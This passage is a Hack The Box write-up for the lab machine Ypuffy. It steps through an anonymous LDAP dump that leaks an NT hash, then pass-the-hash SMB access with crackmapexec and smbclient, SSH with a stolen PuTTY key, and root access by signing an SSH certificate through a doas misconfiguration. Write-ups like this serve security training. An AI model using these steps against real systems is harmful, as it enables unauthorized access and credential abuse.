&lt;h4 id=&quot;full-output&quot;&gt;Full Output:&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-08 14:30 EET
Nmap scan report for ypuffy.htb (10.10.10.107)
Host is up (0.14s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search: 
|   Context: dc=hackthebox,dc=htb
|     dn: dc=hackthebox,dc=htb
|         dc: hackthebox
|         objectClass: top
|         objectClass: domain
|     dn: ou=passwd,dc=hackthebox,dc=htb
|         ou: passwd
|         objectClass: top
|         objectClass: organizationalUnit
|     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
|         uid: bob8791
|         cn: Bob
|         objectClass: account
|         objectClass: posixAccount
|         objectClass: top
|         userPassword: {BSDAUTH}bob8791
|         uidNumber: 5001
|         gidNumber: 5001
|         gecos: Bob
|         homeDirectory: /home/bob8791
|         loginShell: /bin/ksh
|     dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
|         uid: alice1978
|         cn: Alice
|         objectClass: account
|         objectClass: posixAccount
|         objectClass: top
|         objectClass: sambaSamAccount
|         userPassword: {BSDAUTH}alice1978
|         uidNumber: 5000
|         gidNumber: 5000
|         gecos: Alice
|         homeDirectory: /home/alice1978
|         loginShell: /bin/ksh
|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
|         displayName: Alice
|         sambaAcctFlags: [U          ]
|         sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
|         sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
|         sambaPwdLastSet: 1532916644
|     dn: ou=group,dc=hackthebox,dc=htb
|         ou: group
|         objectClass: top
|         objectClass: organizationalUnit
|     dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: bob8791
|         userPassword: {crypt}*
|         gidNumber: 5001
|     dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
|         objectClass: posixGroup
|         objectClass: top
|         cn: alice1978
|         userPassword: {crypt}*
|         gidNumber: 5000
|     dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
|         sambaDomainName: YPUFFY
|         sambaSID: S-1-5-21-3933741069-3307154301-3557023464
|         sambaAlgorithmicRidBase: 1000
|         objectclass: sambaDomain
|         sambaNextUserRid: 1000
|         sambaMinPwdLength: 5
|         sambaPwdHistoryLength: 0
|         sambaLogonToChgPwd: 0
|         sambaMaxPwdAge: -1
|         sambaMinPwdAge: 0
|         sambaLockoutDuration: 30
|         sambaLockoutObservationWindow: 30
|         sambaLockoutThreshold: 0
|         sambaForceLogoff: -1
|         sambaRefuseMachinePwdChange: 0
|_        sambaNextRid: 1001

Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;the-most-interesting-part-is-this-&quot;&gt;The most interesting part is this :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-a-username-alice1978-and-an-smb-nt-hash-0b186e661bbdbdcf6047784de8b9fd8b&quot;&gt;We get a username &lt;code class=&quot;highlighter-rouge&quot;&gt;alice1978&lt;/code&gt; and an smb NT hash &lt;code class=&quot;highlighter-rouge&quot;&gt;0B186E661BBDBDCF6047784DE8B9FD8B&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;this-hash-is-uncrackable-however-we-can-still-use-it-to-authenticate&quot;&gt;This hash is uncrackable however we can still use it to authenticate.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;smb-enumeration&quot;&gt;SMB Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;we-need-to-list-the-shares-first-to-know-where-we-can-connect-we-can-use-a-tool-called-crackmapexec-&quot;&gt;We need to list the shares first to know where we can connect. We can use a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;crackmapexec&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B --shares&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ypuffy/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;there-are-only-two-shares-alice-and-ipc--we-have-read-and-write-permissions-to-alice-and-no-access-to-ipc&quot;&gt;There are only two shares &lt;code class=&quot;highlighter-rouge&quot;&gt;alice&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;IPC$&lt;/code&gt; , we have read and write permissions to &lt;code class=&quot;highlighter-rouge&quot;&gt;alice&lt;/code&gt; and no access to &lt;code class=&quot;highlighter-rouge&quot;&gt;IPC$&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;we-can-also-use-smbclient-to-list-the-shares-&quot;&gt;We can also use smbclient to list the shares :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L //ypuffy.htb/&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ypuffy/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-it-doesnt-tell-us-which-shares-do-we-have-access-to-and-which-we-dont&quot;&gt;But it doesn’t tell us which shares do we have access to and which we don’t.&lt;/h4&gt;
&lt;h4 id=&quot;so-we-know-that-we-can-access-the-share-alice--lets-connect&quot;&gt;So we know that we can access the share &lt;code class=&quot;highlighter-rouge&quot;&gt;alice&lt;/code&gt; , let’s connect.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash //ypuffy.htb/alice&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ypuffy/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;theres-only-one-file-called-my_private_keyppk--get-my_private_keyppk-to-download-it&quot;&gt;There’s only one file called &lt;code class=&quot;highlighter-rouge&quot;&gt;my_private_key.ppk&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;get my_private_key.ppk&lt;/code&gt; to download it.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ssh-and-getting-user&quot;&gt;SSH and getting user&lt;/h3&gt;
&lt;h4 id=&quot;my_private_keyppk-is-a-putty-private-key--we-need-to-convert-that-to-an-ssh-private-key-to-be-able-to-ssh-with-it&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;my_private_key.ppk&lt;/code&gt; is a putty private key , we need to convert that to an ssh private key to be able to ssh with it.&lt;/h4&gt;
&lt;h4 id=&quot;on-kali-i-had-to-get-putty-tools-first&quot;&gt;On kali I had to get &lt;code class=&quot;highlighter-rouge&quot;&gt;putty-tools&lt;/code&gt; first&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;apt-get install putty-tools&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-use-puttygen-&quot;&gt;Then we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;puttygen&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;puttygen my_private_key.ppk -O private-openssh -o alice.key&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-lets-take-a-look-at-the-key-&quot;&gt;Now let’s take a look at the key :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;last-step-is-to-chmod-600-alicekey-and-finally-ssh&quot;&gt;Last step is to &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod 600 alice.key&lt;/code&gt; and finally ssh&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -i alice.key alice1978@ypuffy.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ypuffy/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-user-&quot;&gt;And we owned user !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;more-enumeration&quot;&gt;More Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;remember-http--we-got-a-connection-reset-lets-check-etchttpdconf&quot;&gt;Remember http ? we got a connection reset. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/httpd.conf&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-see-two-interesting-things--location-userca-and-location-sshauth&quot;&gt;We see two interesting things , &lt;code class=&quot;highlighter-rouge&quot;&gt;location &quot;/userca*&quot;&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;location &quot;/sshauth*&quot;&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;after-some-more-enumeration--there-are-3-users-on-the-box&quot;&gt;After some more enumeration , there are 3 users on the box&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;alice1978--bob8791-and-userca&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;alice1978&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;bob8791&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;userca&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;bob8791-has-a-directory-called-dba&quot;&gt;bob8791 has a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;dba&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;inside-it-theres-an-sql-file-called-sshauthsql&quot;&gt;Inside it there’s an sql file called &lt;code class=&quot;highlighter-rouge&quot;&gt;sshauth.sql&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/13.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/ypuffy/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-creates-a-table-called-principals-and-another-table-called-keys&quot;&gt;It creates a table called &lt;code class=&quot;highlighter-rouge&quot;&gt;principals&lt;/code&gt; and another table called &lt;code class=&quot;highlighter-rouge&quot;&gt;keys&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;if-we-also-check-sshd_config-in-etcssh&quot;&gt;If we also check &lt;code class=&quot;highlighter-rouge&quot;&gt;sshd_config&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/ssh/&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#	$OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::

#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key

# Ciphers and keying
#RekeyLimit default none

# Logging
#SyslogFacility AUTH
#LogLevel INFO

# Authentication:

#LoginGraceTime 2m
PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
# but this is overridden so installations will only check .ssh/authorized_keys
AuthorizedKeysFile	.ssh/authorized_keys

#AuthorizedPrincipalsFile none

AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;amp;username=%u
AuthorizedKeysCommandUser nobody

TrustedUserCAKeys /home/userca/ca.pub
AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;amp;username=%u
AuthorizedPrincipalsCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication no
#PermitEmptyPasswords no

# Change to no to disable s/key passwords
ChallengeResponseAuthentication no

AllowAgentForwarding no
AllowTcpForwarding no
#GatewayPorts no
X11Forwarding no
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
#PrintMotd yes
#PrintLastLog yes
#TCPKeepAlive yes
#UseLogin no
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
#Banner none

# override default of no subsystems
Subsystem	sftp	/usr/libexec/sftp-server

# Example of overriding settings on a per-user basis
#Match User anoncvs
#	X11Forwarding no
#	AllowTcpForwarding no
#	PermitTTY no
#	ForceCommand cvs server

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-part-&quot;&gt;This part :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-that-http-service-is-responsible-for-some-ssh-authentication-stuff--and-we-can-request-keys-from-sshauthtypekeysusername-and-principals-from-sshauthtypeprincipalsusername--requesting-keys-for-root-gives-us-no-response--but-requesting-the-principal-we-get-3m3rgencyb4ckd00r&quot;&gt;So that http service is responsible for some ssh authentication stuff , and we can request keys from &lt;code class=&quot;highlighter-rouge&quot;&gt;/sshauth?type=keys&amp;amp;username=&lt;/code&gt; and principals from &lt;code class=&quot;highlighter-rouge&quot;&gt;/sshauth?type=principals&amp;amp;username=&lt;/code&gt; , requesting keys for root gives us no response , but requesting the principal we get &lt;code class=&quot;highlighter-rouge&quot;&gt;3m3rgencyB4ckd00r&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;generating-and-signing-ssh-keys--getting-root&quot;&gt;Generating and signing ssh keys , Getting root&lt;/h3&gt;
&lt;h4 id=&quot;so-now-we-have-roots-principal-3m3rgencyb4ckd00r-theoretically-we-can-generate-ssh-keys-and-sign-them-with-roots-principal--and-we-will-be-able-to-ssh-as-root-with-them&quot;&gt;So now we have root’s principal &lt;code class=&quot;highlighter-rouge&quot;&gt;3m3rgencyB4ckd00r&lt;/code&gt;. Theoretically we can generate ssh keys and sign them with root’s principal , and we will be able to ssh as root with them.&lt;/h4&gt;
&lt;h4 id=&quot;the-problem-is--as-alice1978-we-are-not-authorized-to-do-this-on-linux-we-could-check-if-we-can-run-elevated-commands-with-sudo--l-but-here-theres-no-sudo--instead-of-that-theres-a-command-called-doas--if-we-check-the-config-file-for-it-&quot;&gt;The problem is , as &lt;code class=&quot;highlighter-rouge&quot;&gt;alice1978&lt;/code&gt; we are not authorized to do this. On linux we could check if we can run elevated commands with &lt;code class=&quot;highlighter-rouge&quot;&gt;sudo -l&lt;/code&gt; but here there’s no sudo , instead of that there’s a command called &lt;code class=&quot;highlighter-rouge&quot;&gt;doas&lt;/code&gt; , if we check the config file for it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-run-ssh-keygen-as-userca-without-password&quot;&gt;We can run &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh-keygen&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;userca&lt;/code&gt; without password.&lt;/h4&gt;
&lt;h4 id=&quot;first-step-is-to-create-ssh-keys-for-alice1978&quot;&gt;First step is to create ssh keys for &lt;code class=&quot;highlighter-rouge&quot;&gt;alice1978&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh-keygen -t rsa -f /tmp/id_rsa&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ypuffy/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-need-the-certificate-ca-in-homeuserca-so-we-will-cd-there&quot;&gt;Then we need the certificate (&lt;code class=&quot;highlighter-rouge&quot;&gt;ca&lt;/code&gt;) in &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/userca/&lt;/code&gt; so we will cd there&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ypuffy/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-sign-the-ssh-keys-we-have-just-created-as-root&quot;&gt;And sign the ssh keys we have just created as root&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;doas -u userca /usr/bin/ssh-keygen -s ca -I root -n 3m3rgencyB4ckd00r /tmp/id_rsa.pub&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ypuffy/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;-s-for-certificate---i-for-identity-and--n-for-principal&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-s&lt;/code&gt; for certificate , &lt;code class=&quot;highlighter-rouge&quot;&gt;-I&lt;/code&gt; for identity and &lt;code class=&quot;highlighter-rouge&quot;&gt;-n&lt;/code&gt; for principal&lt;/h4&gt;
&lt;h4 id=&quot;finally-we-will-ssh-as-root-&quot;&gt;Finally we will ssh as root :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -i /tmp/id_rsa root@localhost&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/ypuffy/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---dab&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/dab/&quot;&gt;Hack The Box - Dab&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---giddy&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/giddy/&quot;&gt;Hack The Box - Giddy&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today Ypuffy retired and this is my write-up. This box is a little different from the other boxes. It’s not windows or linux , it’s running openbsd which is a unix-like system. I really liked the privilege escalation in this box because it had some cool ssh stuff. Without talking too much let’s jump right in. It’s a medium difficulty box and its ip is 10.10.10.107 , i added it in /etc/hosts as ypuffy.htb Nmap As always we will start with nmap so : nmap -sV -sT -sC ypuffy.htb Nmap tells us that there’s ssh running on port 22 , http on port 80 , smb on port 139 and 445 , ldap on port 389 It also tells us that we can connect anonymously to ldap. Initial Enumeration Let’s check http first Connection reset. http will be useful later but not now. Moving on to the next thing , we have smb. Let’s see if we can do a null authentication and enumerate the shares. We will use smbmap smbmap -H ypuffy.htb Access Denied. Let’s check ldap LDAP nmap told us that anonymous authentication was allowed so we will use a tool called ldapsearch ldapsearch -h 10.10.10.107 -p 389 -x -b dc=hackthebox,dc=htb Full Output : # extended LDIF # # LDAPv3 # base &amp;lt;dc=hackthebox,dc=htb&amp;gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # hackthebox.htb dn: dc=hackthebox,dc=htb dc: hackthebox objectClass: top objectClass: domain # passwd, hackthebox.htb dn: ou=passwd,dc=hackthebox,dc=htb ou: passwd objectClass: top objectClass: organizationalUnit # bob8791, passwd, hackthebox.htb dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb uid: bob8791 cn: Bob objectClass: account objectClass: posixAccount objectClass: top userPassword:: e0JTREFVVEh9Ym9iODc5MQ== uidNumber: 5001 gidNumber: 5001 gecos: Bob homeDirectory: /home/bob8791 loginShell: /bin/ksh # alice1978, passwd, hackthebox.htb dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb uid: alice1978 cn: Alice objectClass: account objectClass: posixAccount objectClass: top objectClass: sambaSamAccount userPassword:: e0JTREFVVEh9YWxpY2UxOTc4 uidNumber: 5000 gidNumber: 5000 gecos: Alice homeDirectory: /home/alice1978 loginShell: /bin/ksh sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001 displayName: Alice sambaAcctFlags: [U ] sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000 sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B sambaPwdLastSet: 1532916644 # group, hackthebox.htb dn: ou=group,dc=hackthebox,dc=htb ou: group objectClass: top objectClass: organizationalUnit # bob8791, group, hackthebox.htb dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb objectClass: posixGroup objectClass: top cn: bob8791 userPassword:: e2NyeXB0fSo= gidNumber: 5001 # alice1978, group, hackthebox.htb dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb objectClass: posixGroup objectClass: top cn: alice1978 userPassword:: e2NyeXB0fSo= gidNumber: 5000 # ypuffy, hackthebox.htb dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb sambaDomainName: YPUFFY sambaSID: S-1-5-21-3933741069-3307154301-3557023464 sambaAlgorithmicRidBase: 1000 objectclass: sambaDomain sambaNextUserRid: 1000 sambaMinPwdLength: 5 sambaPwdHistoryLength: 0 sambaLogonToChgPwd: 0 sambaMaxPwdAge: -1 sambaMinPwdAge: 0 sambaLockoutDuration: 30 sambaLockoutObservationWindow: 30 sambaLockoutThreshold: 0 sambaForceLogoff: -1 sambaRefuseMachinePwdChange: 0 sambaNextRid: 1001 # search result search: 2 result: 0 Success # numResponses: 9 # numEntries: 8 we can also use nmap to enumerate ldap , with a script called ldap-search nmap -p 389 --script ldap-search ypuffy.htb Full Output: Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-08 14:30 EET Nmap scan report for ypuffy.htb (10.10.10.107) Host is up (0.14s latency). PORT STATE SERVICE 389/tcp open ldap | ldap-search: | Context: dc=hackthebox,dc=htb | dn: dc=hackthebox,dc=htb | dc: hackthebox | objectClass: top | objectClass: domain | dn: ou=passwd,dc=hackthebox,dc=htb | ou: passwd | objectClass: top | objectClass: organizationalUnit | dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb | uid: bob8791 | cn: Bob | objectClass: account | objectClass: posixAccount | objectClass: top | userPassword: {BSDAUTH}bob8791 | uidNumber: 5001 | gidNumber: 5001 | gecos: Bob | homeDirectory: /home/bob8791 | loginShell: /bin/ksh | dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb | uid: alice1978 | cn: Alice | objectClass: account | objectClass: posixAccount | objectClass: top | objectClass: sambaSamAccount | userPassword: {BSDAUTH}alice1978 | uidNumber: 5000 | gidNumber: 5000 | gecos: Alice | homeDirectory: /home/alice1978 | loginShell: /bin/ksh | sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001 | displayName: Alice | sambaAcctFlags: [U ] | sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000 | sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B | sambaPwdLastSet: 1532916644 | dn: ou=group,dc=hackthebox,dc=htb | ou: group | objectClass: top | objectClass: organizationalUnit | dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb | objectClass: posixGroup | objectClass: top | cn: bob8791 | userPassword: {crypt}* | gidNumber: 5001 | dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb | objectClass: posixGroup | objectClass: top | cn: alice1978 | userPassword: {crypt}* | gidNumber: 5000 | dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb | sambaDomainName: YPUFFY | sambaSID: S-1-5-21-3933741069-3307154301-3557023464 | sambaAlgorithmicRidBase: 1000 | objectclass: sambaDomain | sambaNextUserRid: 1000 | sambaMinPwdLength: 5 | sambaPwdHistoryLength: 0 | sambaLogonToChgPwd: 0 | sambaMaxPwdAge: -1 | sambaMinPwdAge: 0 | sambaLockoutDuration: 30 | sambaLockoutObservationWindow: 30 | sambaLockoutThreshold: 0 | sambaForceLogoff: -1 | sambaRefuseMachinePwdChange: 0 |_ sambaNextRid: 1001 Nmap done: 1 IP address (1 host up) scanned in 2.17 seconds The most interesting part is this : We get a username alice1978 and an smb NT hash 0B186E661BBDBDCF6047784DE8B9FD8B This hash is uncrackable however we can still use it to authenticate. SMB Enumeration We need to list the shares first to know where we can connect. We can use a tool called crackmapexec : crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B --shares There are only two shares alice and IPC$ , we have read and write permissions to alice and no access to IPC$ We can also use smbclient to list the shares : smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -L //ypuffy.htb/ But it doesn’t tell us which shares do we have access to and which we don’t. So we know that we can access the share alice , let’s connect. smbclient -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash //ypuffy.htb/alice There’s only one file called my_private_key.ppk , get my_private_key.ppk to download it. SSH and getting user my_private_key.ppk is a putty private key , we need to convert that to an ssh private key to be able to ssh with it. On kali I had to get putty-tools first apt-get install putty-tools Then we will use puttygen : puttygen my_private_key.ppk -O private-openssh -o alice.key Now let’s take a look at the key : Last step is to chmod 600 alice.key and finally ssh ssh -i alice.key alice1978@ypuffy.htb And we owned user ! More Enumeration Remember http ? we got a connection reset. Let’s check /etc/httpd.conf We see two interesting things , location &quot;/userca*&quot; and location &quot;/sshauth*&quot; After some more enumeration , there are 3 users on the box alice1978 , bob8791 and userca bob8791 has a directory called dba Inside it there’s an sql file called sshauth.sql It creates a table called principals and another table called keys If we also check sshd_config in /etc/ssh/ # $OpenBSD: sshd_config,v 1.102 2018/02/16 02:32:40 djm Exp $ # This is the sshd server system-wide configuration file. See # sshd_config(5) for more information. # The strategy used for options in the default sshd_config shipped with # OpenSSH is to specify options with their default value where # possible, but leave them commented. Uncommented options override the # default value. #Port 22 #AddressFamily any #ListenAddress 0.0.0.0 #ListenAddress :: #HostKey /etc/ssh/ssh_host_rsa_key #HostKey /etc/ssh/ssh_host_ecdsa_key #HostKey /etc/ssh/ssh_host_ed25519_key # Ciphers and keying #RekeyLimit default none # Logging #SyslogFacility AUTH #LogLevel INFO # Authentication: #LoginGraceTime 2m PermitRootLogin prohibit-password #StrictModes yes #MaxAuthTries 6 #MaxSessions 10 #PubkeyAuthentication yes # The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2 # but this is overridden so installations will only check .ssh/authorized_keys AuthorizedKeysFile .ssh/authorized_keys #AuthorizedPrincipalsFile none AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;amp;username=%u AuthorizedKeysCommandUser nobody TrustedUserCAKeys /home/userca/ca.pub AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;amp;username=%u AuthorizedPrincipalsCommandUser nobody # For this to work you will also need host keys in /etc/ssh/ssh_known_hosts #HostbasedAuthentication no # Change to yes if you don't trust ~/.ssh/known_hosts for # HostbasedAuthentication #IgnoreUserKnownHosts no # Don't read the user's ~/.rhosts and ~/.shosts files 